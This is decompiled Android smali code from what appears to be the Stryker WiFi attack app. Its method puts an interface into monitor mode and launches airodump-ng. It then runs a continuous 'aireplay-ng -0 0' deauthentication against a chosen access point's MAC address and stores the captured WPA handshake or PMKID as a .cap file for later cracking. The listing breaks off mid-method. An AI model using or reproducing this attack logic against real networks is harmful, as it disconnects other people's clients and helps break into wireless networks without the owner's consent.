.class public final Lo4/p;
.super Ll4/h;
.source "SourceFile"


# instance fields
.field public final synthetic e:Landroid/widget/ImageView;

.field public final synthetic f:Landroid/widget/ProgressBar;

.field public final synthetic g:Landroid/widget/TextView;

.field public final synthetic h:Landroid/view/View;

.field public final synthetic i:Landroid/widget/TextView;

.field public final synthetic j:[Z

.field public final synthetic k:[Z

.field public final synthetic l:Landroid/widget/TextView;

.field public final synthetic m:Lcom/zalexdev/stryker/custom/WiFINetwork;

.field public final synthetic n:[Ljava/lang/String;

.field public final synthetic o:[Ljava/lang/String;

.field public final synthetic p:Ljava/util/Timer;

.field public final synthetic q:Lo4/u;


# direct methods
.method public constructor <init>(Lo4/u;Landroid/app/Activity;Landroid/content/Context;Landroid/widget/ImageView;Landroid/widget/ProgressBar;Landroid/widget/TextView;Landroid/view/View;Landroid/widget/TextView;[Z[ZLandroid/widget/TextView;Lcom/zalexdev/stryker/custom/WiFINetwork;[Ljava/lang/String;[Ljava/lang/String;Ljava/util/Timer;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lo4/p;->q:Lo4/u;

    iput-object p4, p0, Lo4/p;->e:Landroid/widget/ImageView;

    iput-object p5, p0, Lo4/p;->f:Landroid/widget/ProgressBar;

    iput-object p6, p0, Lo4/p;->g:Landroid/widget/TextView;

    iput-object p7, p0, Lo4/p;->h:Landroid/view/View;

    iput-object p8, p0, Lo4/p;->i:Landroid/widget/TextView;

    iput-object p9, p0, Lo4/p;->j:[Z

    iput-object p10, p0, Lo4/p;->k:[Z

    iput-object p11, p0, Lo4/p;->l:Landroid/widget/TextView;

    iput-object p12, p0, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    iput-object p13, p0, Lo4/p;->n:[Ljava/lang/String;

    iput-object p14, p0, Lo4/p;->o:[Ljava/lang/String;

    iput-object p15, p0, Lo4/p;->p:Ljava/util/Timer;

    invoke-direct {p0, p2, p3}, Ll4/h;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    return-void
.end method


# virtual methods
.method public final a()V
    .locals 17

    .line 1
    move-object/from16 v10, p0

    .line 2
    .line 3
    iget-object v0, v10, Ll4/h;->c:Ll4/l;

    .line 4
    .line 5
    invoke-virtual {v0}, Ll4/l;->B()Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    move-result-object v0

    .line 9
    iget-object v1, v10, Ll4/h;->c:Ll4/l;

    .line 10
    .line 11
    invoke-virtual {v1}, Ll4/l;->y()Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object v1

    .line 15
    new-instance v11, Ljava/util/ArrayList;

    .line 16
    .line 17
    invoke-direct {v11}, Ljava/util/ArrayList;-><init>()V

    .line 18
    .line 19
    .line 20
    iget-object v2, v10, Ll4/h;->c:Ll4/l;

    .line 21
    .line 22
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 23
    .line 24
    .line 25
    invoke-static {v2}, Lorg/bouncycastle/math/ec/a;->a(Ll4/l;)Z

    .line 26
    .line 27
    .line 28
    move-result v2

    .line 29
    const/4 v12, 0x1

    .line 30
    const/4 v13, 0x0

    .line 31
    if-nez v2, :cond_1

    .line 32
    .line 33
    invoke-static {v1}, Ll4/m;->j(Ljava/lang/String;)Z

    .line 34
    .line 35
    .line 36
    move-result v2

    .line 37
    if-eqz v2, :cond_1

    .line 38
    .line 39
    invoke-static {v0}, Ll4/m;->j(Ljava/lang/String;)Z

    .line 40
    .line 41
    .line 42
    move-result v2

    .line 43
    if-nez v2, :cond_0

    .line 44
    .line 45
    new-instance v1, Ljava/lang/StringBuilder;

    .line 46
    .line 47
    const-string v2, "Deauth interface is the internal radio \u2014 using "

    .line 48
    .line 49
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 50
    .line 51
    .line 52
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 53
    .line 54
    .line 55
    const-string v2, " instead"

    .line 56
    .line 57
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 58
    .line 59
    .line 60
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 61
    .line 62
    .line 63
    move-result-object v1

    .line 64
    invoke-virtual {v10, v1}, Ll4/h;->e(Ljava/lang/String;)V

    .line 65
    .line 66
    .line 67
    move-object v14, v0

    .line 68
    :goto_0
    move v15, v12

    .line 69
    goto :goto_1

    .line 70
    :cond_0
    move-object v14, v1

    .line 71
    move v15, v13

    .line 72
    goto :goto_1

    .line 73
    :cond_1
    move-object v14, v1

    .line 74
    goto :goto_0

    .line 75
    :goto_1
    const-string v1, "Enabling monitor mode..."

    .line 76
    .line 77
    invoke-virtual {v10, v1}, Ll4/h;->e(Ljava/lang/String;)V

    .line 78
    .line 79
    .line 80
    iget-object v1, v10, Ll4/h;->c:Ll4/l;

    .line 81
    .line 82
    iget-object v1, v1, Ll4/l;->e:Ll4/m;

    .line 83
    .line 84
    iget-object v2, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 85
    .line 86
    invoke-virtual {v2}, Lcom/zalexdev/stryker/custom/WiFINetwork;->getChannel()I

    .line 87
    .line 88
    .line 89
    move-result v2

    .line 90
    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 91
    .line 92
    .line 93
    move-result-object v2

    .line 94
    invoke-virtual {v1, v0, v2}, Ll4/m;->d(Ljava/lang/String;Ljava/lang/String;)Z

    .line 95
    .line 96
    .line 97
    move-result v1

    .line 98
    if-eqz v15, :cond_2

    .line 99
    .line 100
    invoke-virtual {v0, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 101
    .line 102
    .line 103
    move-result v0

    .line 104
    if-nez v0, :cond_2

    .line 105
    .line 106
    iget-object v0, v10, Ll4/h;->c:Ll4/l;

    .line 107
    .line 108
    iget-object v0, v0, Ll4/l;->e:Ll4/m;

    .line 109
    .line 110
    iget-object v2, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 111
    .line 112
    invoke-virtual {v2}, Lcom/zalexdev/stryker/custom/WiFINetwork;->getChannel()I

    .line 113
    .line 114
    .line 115
    move-result v2

    .line 116
    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 117
    .line 118
    .line 119
    move-result-object v2

    .line 120
    invoke-virtual {v0, v14, v2}, Ll4/m;->d(Ljava/lang/String;Ljava/lang/String;)Z

    .line 121
    .line 122
    .line 123
    move-result v0

    .line 124
    goto :goto_2

    .line 125
    :cond_2
    move v0, v12

    .line 126
    :goto_2
    new-array v9, v12, [Z

    .line 127
    .line 128
    aput-boolean v13, v9, v13

    .line 129
    .line 130
    if-eqz v1, :cond_1e

    .line 131
    .line 132
    if-eqz v0, :cond_1e

    .line 133
    .line 134
    const-string v0, "Starting airodump-ng..."

    .line 135
    .line 136
    invoke-virtual {v10, v0}, Ll4/h;->e(Ljava/lang/String;)V

    .line 137
    .line 138
    .line 139
    iget-object v0, v10, Ll4/h;->c:Ll4/l;

    .line 140
    .line 141
    const-string v1, "mkdir -p /sdcard/Stryker/hs /sdcard/Stryker/captured; rm -f /sdcard/Stryker/hs/handshake*"

    .line 142
    .line 143
    invoke-virtual {v0, v1}, Ll4/l;->n(Ljava/lang/String;)Ljava/util/ArrayList;

    .line 144
    .line 145
    .line 146
    iget-object v0, v10, Ll4/h;->c:Ll4/l;

    .line 147
    .line 148
    invoke-virtual {v0}, Ll4/l;->B()Ljava/lang/String;

    .line 149
    .line 150
    .line 151
    move-result-object v0

    .line 152
    iget-boolean v1, v10, Ll4/h;->d:Z

    .line 153
    .line 154
    if-eqz v1, :cond_3

    .line 155
    .line 156
    return-void

    .line 157
    :cond_3
    new-instance v8, Ljava/lang/Thread;

    .line 158
    .line 159
    iget-object v4, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 160
    .line 161
    iget-object v6, v10, Lo4/p;->n:[Ljava/lang/String;

    .line 162
    .line 163
    iget-object v7, v10, Lo4/p;->j:[Z

    .line 164
    .line 165
    iget-object v5, v10, Lo4/p;->k:[Z

    .line 166
    .line 167
    new-instance v3, Lr3/b;

    .line 168
    .line 169
    move-object v1, v3

    .line 170
    move-object/from16 v2, p0

    .line 171
    .line 172
    move-object v12, v3

    .line 173
    move-object v3, v0

    .line 174
    move-object/from16 v16, v5

    .line 175
    .line 176
    move-object v5, v9

    .line 177
    move-object v13, v8

    .line 178
    move-object/from16 v8, v16

    .line 179
    .line 180
    move-object/from16 v16, v9

    .line 181
    .line 182
    move-object v9, v11

    .line 183
    invoke-direct/range {v1 .. v9}, Lr3/b;-><init>(Lo4/p;Ljava/lang/String;Lcom/zalexdev/stryker/custom/WiFINetwork;[Z[Ljava/lang/String;[Z[ZLjava/util/ArrayList;)V

    .line 184
    .line 185
    .line 186
    invoke-direct {v13, v12}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 187
    .line 188
    .line 189
    invoke-virtual {v13}, Ljava/lang/Thread;->start()V

    .line 190
    .line 191
    .line 192
    const-string v1, "We are waiting for network to appear..."

    .line 193
    .line 194
    invoke-virtual {v10, v1}, Ll4/h;->e(Ljava/lang/String;)V

    .line 195
    .line 196
    .line 197
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 198
    .line 199
    .line 200
    move-result-wide v1

    .line 201
    const-wide/32 v3, 0xea60

    .line 202
    .line 203
    .line 204
    add-long/2addr v1, v3

    .line 205
    :goto_3
    const/4 v3, 0x0

    .line 206
    aget-boolean v4, v16, v3

    .line 207
    .line 208
    if-nez v4, :cond_4

    .line 209
    .line 210
    iget-boolean v3, v10, Ll4/h;->d:Z

    .line 211
    .line 212
    if-nez v3, :cond_4

    .line 213
    .line 214
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 215
    .line 216
    .line 217
    move-result-wide v3

    .line 218
    cmp-long v3, v3, v1

    .line 219
    .line 220
    if-gez v3, :cond_4

    .line 221
    .line 222
    const-wide/16 v3, 0x3e8

    .line 223
    .line 224
    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 225
    .line 226
    .line 227
    goto :goto_3

    .line 228
    :catch_0
    :cond_4
    iget-boolean v1, v10, Ll4/h;->d:Z

    .line 229
    .line 230
    if-eqz v1, :cond_5

    .line 231
    .line 232
    return-void

    .line 233
    :cond_5
    const/4 v1, 0x0

    .line 234
    aget-boolean v2, v16, v1

    .line 235
    .line 236
    if-nez v2, :cond_7

    .line 237
    .line 238
    const-string v0, "Target never showed up on this channel \u2014 aborting."

    .line 239
    .line 240
    invoke-virtual {v10, v0}, Ll4/h;->e(Ljava/lang/String;)V

    .line 241
    .line 242
    .line 243
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 244
    .line 245
    iget-object v0, v0, Lo4/u;->k:Lr3/q;

    .line 246
    .line 247
    if-eqz v0, :cond_6

    .line 248
    .line 249
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 250
    .line 251
    iget-object v0, v0, Lo4/u;->k:Lr3/q;

    .line 252
    .line 253
    invoke-virtual {v0}, Ll4/c;->a()V

    .line 254
    .line 255
    .line 256
    :cond_6
    invoke-virtual/range {p0 .. p0}, Ll4/h;->f()V

    .line 257
    .line 258
    .line 259
    return-void

    .line 260
    :cond_7
    const-string v1, "Airodump-ng launched!"

    .line 261
    .line 262
    invoke-virtual {v10, v1}, Ll4/h;->e(Ljava/lang/String;)V

    .line 263
    .line 264
    .line 265
    if-nez v15, :cond_8

    .line 266
    .line 267
    const-string v1, "Can`t deauth with (s)wlan0 interface! Passive mode!"

    .line 268
    .line 269
    :goto_4
    invoke-virtual {v10, v1}, Ll4/h;->e(Ljava/lang/String;)V

    .line 270
    .line 271
    .line 272
    goto :goto_5

    .line 273
    :cond_8
    const-string v1, "Starting deauth..."

    .line 274
    .line 275
    goto :goto_4

    .line 276
    :goto_5
    iget-object v1, v10, Ll4/h;->c:Ll4/l;

    .line 277
    .line 278
    iget-object v1, v1, Ll4/l;->e:Ll4/m;

    .line 279
    .line 280
    new-instance v2, Ljava/lang/StringBuilder;

    .line 281
    .line 282
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 283
    .line 284
    .line 285
    invoke-virtual {v2, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 286
    .line 287
    .line 288
    const-string v3, "mon"

    .line 289
    .line 290
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 291
    .line 292
    .line 293
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 294
    .line 295
    .line 296
    move-result-object v2

    .line 297
    invoke-virtual {v1, v2}, Ll4/m;->k(Ljava/lang/String;)Z

    .line 298
    .line 299
    .line 300
    move-result v1

    .line 301
    if-eqz v1, :cond_9

    .line 302
    .line 303
    invoke-static {v14, v3}, Lo/i;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 304
    .line 305
    .line 306
    move-result-object v14

    .line 307
    :cond_9
    iget-object v1, v10, Ll4/h;->c:Ll4/l;

    .line 308
    .line 309
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 310
    .line 311
    .line 312
    invoke-static {v1}, Lorg/bouncycastle/math/ec/a;->a(Ll4/l;)Z

    .line 313
    .line 314
    .line 315
    move-result v1

    .line 316
    if-nez v1, :cond_a

    .line 317
    .line 318
    invoke-static {v14}, Ll4/m;->j(Ljava/lang/String;)Z

    .line 319
    .line 320
    .line 321
    move-result v1

    .line 322
    if-eqz v1, :cond_a

    .line 323
    .line 324
    const/4 v8, 0x1

    .line 325
    goto :goto_6

    .line 326
    :cond_a
    const/4 v8, 0x0

    .line 327
    :goto_6
    const-string v1, ""

    .line 328
    .line 329
    filled-new-array {v1}, [Ljava/lang/String;

    .line 330
    .line 331
    .line 332
    move-result-object v6

    .line 333
    const-string v9, " "

    .line 334
    .line 335
    if-eqz v15, :cond_b

    .line 336
    .line 337
    iget-object v12, v10, Lo4/p;->q:Lo4/u;

    .line 338
    .line 339
    new-instance v13, Lo4/o;

    .line 340
    .line 341
    iget-object v3, v10, Ll4/h;->a:Landroid/app/Activity;

    .line 342
    .line 343
    iget-object v4, v10, Ll4/h;->b:Landroid/content/Context;

    .line 344
    .line 345
    new-instance v1, Ljava/lang/StringBuilder;

    .line 346
    .line 347
    const-string v2, "aireplay-ng --ignore-negative-one -0 0 -a  "

    .line 348
    .line 349
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 350
    .line 351
    .line 352
    iget-object v2, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 353
    .line 354
    invoke-virtual {v2}, Lcom/zalexdev/stryker/custom/WiFINetwork;->getMac()Ljava/lang/String;

    .line 355
    .line 356
    .line 357
    move-result-object v2

    .line 358
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 359
    .line 360
    .line 361
    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 362
    .line 363
    .line 364
    invoke-virtual {v1, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 365
    .line 366
    .line 367
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 368
    .line 369
    .line 370
    move-result-object v5

    .line 371
    move-object v1, v13

    .line 372
    move-object/from16 v2, p0

    .line 373
    .line 374
    move-object v7, v0

    .line 375
    invoke-direct/range {v1 .. v8}, Lo4/o;-><init>(Lo4/p;Landroid/app/Activity;Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Z)V

    .line 376
    .line 377
    .line 378
    iput-object v13, v12, Lo4/u;->g:Ll4/c;

    .line 379
    .line 380
    :cond_b
    :goto_7
    iget-object v0, v10, Lo4/p;->j:[Z

    .line 381
    .line 382
    const/4 v1, 0x0

    .line 383
    aget-boolean v0, v0, v1

    .line 384
    .line 385
    if-nez v0, :cond_e

    .line 386
    .line 387
    iget-object v0, v10, Lo4/p;->k:[Z

    .line 388
    .line 389
    aget-boolean v0, v0, v1

    .line 390
    .line 391
    if-nez v0, :cond_e

    .line 392
    .line 393
    iget-boolean v0, v10, Ll4/h;->d:Z

    .line 394
    .line 395
    if-nez v0, :cond_e

    .line 396
    .line 397
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 398
    .line 399
    iget-object v0, v0, Lo4/u;->k:Lr3/q;

    .line 400
    .line 401
    if-eqz v0, :cond_c

    .line 402
    .line 403
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 404
    .line 405
    iget-object v0, v0, Lo4/u;->k:Lr3/q;

    .line 406
    .line 407
    iget-boolean v0, v0, Ll4/c;->n:Z

    .line 408
    .line 409
    if-nez v0, :cond_c

    .line 410
    .line 411
    const-string v0, "airodump-ng stopped unexpectedly \u2014 aborting."

    .line 412
    .line 413
    invoke-virtual {v10, v0}, Ll4/h;->e(Ljava/lang/String;)V

    .line 414
    .line 415
    .line 416
    goto :goto_9

    .line 417
    :cond_c
    new-instance v4, Ljava/lang/StringBuilder;

    .line 418
    .line 419
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 420
    .line 421
    .line 422
    invoke-virtual {v11}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    .line 423
    .line 424
    .line 425
    move-result-object v0

    .line 426
    :goto_8
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 427
    .line 428
    .line 429
    move-result v1

    .line 430
    if-eqz v1, :cond_d

    .line 431
    .line 432
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 433
    .line 434
    .line 435
    move-result-object v1

    .line 436
    check-cast v1, Ljava/lang/String;

    .line 437
    .line 438
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 439
    .line 440
    .line 441
    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 442
    .line 443
    .line 444
    goto :goto_8

    .line 445
    :cond_d
    iget-object v0, v10, Ll4/h;->a:Landroid/app/Activity;

    .line 446
    .line 447
    iget-object v3, v10, Lo4/p;->n:[Ljava/lang/String;

    .line 448
    .line 449
    iget-object v6, v10, Lo4/p;->o:[Ljava/lang/String;

    .line 450
    .line 451
    iget-object v7, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 452
    .line 453
    iget-object v8, v10, Lo4/p;->l:Landroid/widget/TextView;

    .line 454
    .line 455
    new-instance v12, Lr3/b;

    .line 456
    .line 457
    move-object v1, v12

    .line 458
    move-object/from16 v2, p0

    .line 459
    .line 460
    move-object v5, v11

    .line 461
    invoke-direct/range {v1 .. v8}, Lr3/b;-><init>(Lo4/p;[Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/util/ArrayList;[Ljava/lang/String;Lcom/zalexdev/stryker/custom/WiFINetwork;Landroid/widget/TextView;)V

    .line 462
    .line 463
    .line 464
    invoke-virtual {v0, v12}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 465
    .line 466
    .line 467
    const-wide/16 v0, 0xc8

    .line 468
    .line 469
    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 470
    .line 471
    .line 472
    goto :goto_7

    .line 473
    :catch_1
    move-exception v0

    .line 474
    move-object v1, v0

    .line 475
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 476
    .line 477
    .line 478
    goto :goto_7

    .line 479
    :cond_e
    :goto_9
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 480
    .line 481
    iget-object v0, v0, Lo4/u;->g:Ll4/c;

    .line 482
    .line 483
    if-eqz v0, :cond_f

    .line 484
    .line 485
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 486
    .line 487
    iget-object v0, v0, Lo4/u;->g:Ll4/c;

    .line 488
    .line 489
    invoke-virtual {v0}, Ll4/c;->a()V

    .line 490
    .line 491
    .line 492
    :cond_f
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 493
    .line 494
    iget-object v0, v0, Lo4/u;->k:Lr3/q;

    .line 495
    .line 496
    if-eqz v0, :cond_10

    .line 497
    .line 498
    iget-object v0, v10, Lo4/p;->q:Lo4/u;

    .line 499
    .line 500
    iget-object v0, v0, Lo4/u;->k:Lr3/q;

    .line 501
    .line 502
    invoke-virtual {v0}, Ll4/c;->a()V

    .line 503
    .line 504
    .line 505
    :cond_10
    iget-boolean v0, v10, Ll4/h;->d:Z

    .line 506
    .line 507
    if-eqz v0, :cond_11

    .line 508
    .line 509
    return-void

    .line 510
    :cond_11
    new-instance v0, Ljava/lang/StringBuilder;

    .line 511
    .line 512
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 513
    .line 514
    .line 515
    iget-object v1, v10, Ll4/h;->c:Ll4/l;

    .line 516
    .line 517
    invoke-virtual {v1}, Ll4/l;->H()Ljava/lang/String;

    .line 518
    .line 519
    .line 520
    move-result-object v1

    .line 521
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 522
    .line 523
    .line 524
    const-string v1, "/captured"

    .line 525
    .line 526
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 527
    .line 528
    .line 529
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 530
    .line 531
    .line 532
    move-result-object v0

    .line 533
    new-instance v1, Ljava/text/SimpleDateFormat;

    .line 534
    .line 535
    const-string v2, "MM_HH_mm"

    .line 536
    .line 537
    sget-object v3, Ljava/util/Locale;->ENGLISH:Ljava/util/Locale;

    .line 538
    .line 539
    invoke-direct {v1, v2, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 540
    .line 541
    .line 542
    new-instance v2, Ljava/util/Date;

    .line 543
    .line 544
    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    .line 545
    .line 546
    .line 547
    invoke-virtual {v1, v2}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    .line 548
    .line 549
    .line 550
    move-result-object v1

    .line 551
    iget-object v2, v10, Lo4/p;->j:[Z

    .line 552
    .line 553
    const/4 v3, 0x0

    .line 554
    aget-boolean v2, v2, v3

    .line 555
    .line 556
    if-eqz v2, :cond_12

    .line 557
    .line 558
    const-string v2, "HS_"

    .line 559
    .line 560
    goto :goto_a

    .line 561
    :cond_12
    const-string v2, "PMKID_"

    .line 562
    .line 563
    :goto_a
    invoke-static {v2}, Lo/i;->b(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 564
    .line 565
    .line 566
    move-result-object v2

    .line 567
    iget-object v3, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 568
    .line 569
    invoke-virtual {v3}, Lcom/zalexdev/stryker/custom/WiFINetwork;->getSsid()Ljava/lang/String;

    .line 570
    .line 571
    .line 572
    move-result-object v3

    .line 573
    const-string v4, "_"

    .line 574
    .line 575
    invoke-virtual {v3, v9, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    .line 576
    .line 577
    .line 578
    move-result-object v3

    .line 579
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 580
    .line 581
    .line 582
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 583
    .line 584
    .line 585
    const-string v1, ".cap"

    .line 586
    .line 587
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 588
    .line 589
    .line 590
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 591
    .line 592
    .line 593
    move-result-object v1

    .line 594
    iget-object v2, v10, Lo4/p;->j:[Z

    .line 595
    .line 596
    const/4 v3, 0x0

    .line 597
    aget-boolean v2, v2, v3

    .line 598
    .line 599
    if-eqz v2, :cond_13

    .line 600
    .line 601
    const-string v2, "Handshake captured!"

    .line 602
    .line 603
    goto :goto_b

    .line 604
    :cond_13
    const-string v2, "PMKID captured!"

    .line 605
    .line 606
    :goto_b
    invoke-virtual {v10, v2}, Ll4/h;->e(Ljava/lang/String;)V

    .line 607
    .line 608
    .line 609
    iget-object v2, v10, Lo4/p;->q:Lo4/u;

    .line 610
    .line 611
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 612
    .line 613
    .line 614
    const-string v3, "[^A-Za-z0-9._-]"

    .line 615
    .line 616
    invoke-virtual {v1, v3, v4}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 617
    .line 618
    .line 619
    move-result-object v1

    .line 620
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 621
    .line 622
    .line 623
    move-result v3

    .line 624
    const/16 v4, 0x78

    .line 625
    .line 626
    if-le v3, v4, :cond_14

    .line 627
    .line 628
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 629
    .line 630
    .line 631
    move-result v3

    .line 632
    sub-int/2addr v3, v4

    .line 633
    invoke-virtual {v1, v3}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    .line 634
    .line 635
    .line 636
    move-result-object v1

    .line 637
    :cond_14
    const-string v3, "/"

    .line 638
    .line 639
    invoke-static {v0, v3, v1}, Landroid/support/v4/media/session/a;->q(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 640
    .line 641
    .line 642
    move-result-object v1

    .line 643
    new-instance v3, Ljava/lang/StringBuilder;

    .line 644
    .line 645
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 646
    .line 647
    .line 648
    iget-object v2, v2, Lo4/u;->d:Ll4/l;

    .line 649
    .line 650
    invoke-virtual {v2}, Ll4/l;->H()Ljava/lang/String;

    .line 651
    .line 652
    .line 653
    move-result-object v4

    .line 654
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 655
    .line 656
    .line 657
    const-string v4, "/hs"

    .line 658
    .line 659
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 660
    .line 661
    .line 662
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 663
    .line 664
    .line 665
    move-result-object v3

    .line 666
    new-instance v4, Ljava/io/File;

    .line 667
    .line 668
    invoke-direct {v4, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 669
    .line 670
    .line 671
    invoke-virtual {v4}, Ljava/io/File;->mkdirs()Z

    .line 672
    .line 673
    .line 674
    new-instance v4, Ljava/io/File;

    .line 675
    .line 676
    invoke-direct {v4, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 677
    .line 678
    .line 679
    new-instance v5, Lx2/a;

    .line 680
    .line 681
    const/4 v6, 0x3

    .line 682
    invoke-direct {v5, v6}, Lx2/a;-><init>(I)V

    .line 683
    .line 684
    .line 685
    invoke-virtual {v4, v5}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    .line 686
    .line 687
    .line 688
    move-result-object v4

    .line 689
    const/4 v5, 0x0

    .line 690
    if-eqz v4, :cond_17

    .line 691
    .line 692
    array-length v6, v4

    .line 693
    move-object v8, v5

    .line 694
    const/4 v7, 0x0

    .line 695
    :goto_c
    if-ge v7, v6, :cond_18

    .line 696
    .line 697
    aget-object v9, v4, v7

    .line 698
    .line 699
    if-eqz v8, :cond_15

    .line 700
    .line 701
    invoke-virtual {v9}, Ljava/io/File;->lastModified()J

    .line 702
    .line 703
    .line 704
    move-result-wide v11

    .line 705
    invoke-virtual {v8}, Ljava/io/File;->lastModified()J

    .line 706
    .line 707
    .line 708
    move-result-wide v13

    .line 709
    cmp-long v11, v11, v13

    .line 710
    .line 711
    if-lez v11, :cond_16

    .line 712
    .line 713
    :cond_15
    move-object v8, v9

    .line 714
    :cond_16
    add-int/lit8 v7, v7, 0x1

    .line 715
    .line 716
    goto :goto_c

    .line 717
    :cond_17
    move-object v8, v5

    .line 718
    :cond_18
    if-eqz v8, :cond_19

    .line 719
    .line 720
    invoke-virtual {v8}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 721
    .line 722
    .line 723
    move-result-object v4

    .line 724
    invoke-virtual {v2, v4, v1}, Ll4/l;->X(Ljava/lang/String;Ljava/lang/String;)V

    .line 725
    .line 726
    .line 727
